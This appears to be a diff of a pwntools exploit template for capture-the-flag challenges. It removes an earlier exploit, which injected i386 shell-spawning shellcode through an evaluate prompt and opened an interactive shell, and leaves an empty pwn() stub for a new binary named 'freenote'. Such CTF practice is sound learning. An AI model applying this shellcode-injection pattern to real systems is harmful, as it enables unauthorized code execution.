@@ -8,7 +8,7 @@ DEBUG = 1
 io = None
 
 if DEBUG: context(log_level='debug')
-# define symbols and offsets here
+
 
 # simplified r/s function
 def ru(delim):
@@ -41,28 +41,21 @@ def dehex(s):
 def sendflag(flag):
     pass
 
-def evaluate(s):
-    ru('> ')
-    sl(s)
-    return
-
-shellcode = asm(shellcraft.i386.linux.sh())
+# define symbols and offsets here
 
 # define exploit function here
 def pwn():
-    payload = 'var add = "{}"'.format(shellcode)
-    evaluate(payload)
-    evaluate('1 + 1')
-    io.interactive()
-    return
+    
 
 if __name__ == '__main__':
     
     global io
 
     if DEBUG: 
-        io = process('./123')
+        io = process('./freenote')
+        pause()
         pwn()
+        io.interactive()
 
     else:
         f = open(sys.argv[1], 'r')
